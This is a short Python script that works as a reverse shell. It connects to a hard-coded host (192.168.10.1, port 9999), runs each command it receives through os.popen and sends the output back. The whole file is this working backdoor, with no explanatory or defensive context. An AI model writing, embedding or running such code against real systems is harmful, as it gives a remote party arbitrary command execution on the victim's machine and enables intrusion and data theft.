import socket
import sys
import os


host = '192.168.10.1'
port = 9999
ADDR = (host, port)

def create():
    global session
    session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():

    try:
       session.connect(ADDR)
       print("[+]Connection is build up")

    except:
        print("[-]Can not connect to host")

def listen():

    while True:
        command = session.recv(1024)
        final = command.decode()
        try:
           turn = os.popen(final).read()
           session.send(turn.encode())

        except:
           session.send(("[-]Command has not been done!").encode())

def main():
    create()
    connect()
    listen()

main()